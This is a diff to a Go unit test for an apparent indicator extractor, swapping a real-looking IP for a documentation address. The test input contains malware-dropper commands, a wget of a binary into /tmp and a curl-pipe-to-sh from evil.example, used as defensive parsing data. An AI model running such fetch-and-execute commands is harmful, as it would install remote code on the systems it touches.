@@ -11,14 +11,14 @@ import (
 )
 
 func TestExtract(t *testing.T) {
-	text := `cd /tmp; wget http://185.246.0.1:8080/bins/x86 -O /tmp/x; ` +
+	text := `cd /tmp; wget http://198.51.100.23:8080/bins/x86 -O /tmp/x; ` +
 		`curl https://evil.example/a.sh | sh; ping 8.8.8.8; ` +
 		`echo e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`
 	i := Extract(text)
 	if len(i.URLs) != 2 {
 		t.Errorf("URLs = %v", i.URLs)
 	}
-	// 185.246.0.1 is inside a URL and must not repeat; 8.8.8.8 stands alone.
+	// 198.51.100.23 is inside a URL and must not repeat; 8.8.8.8 stands alone.
 	if len(i.IPs) != 1 || i.IPs[0] != "8.8.8.8" {
 		t.Errorf("IPs = %v", i.IPs)
 	}
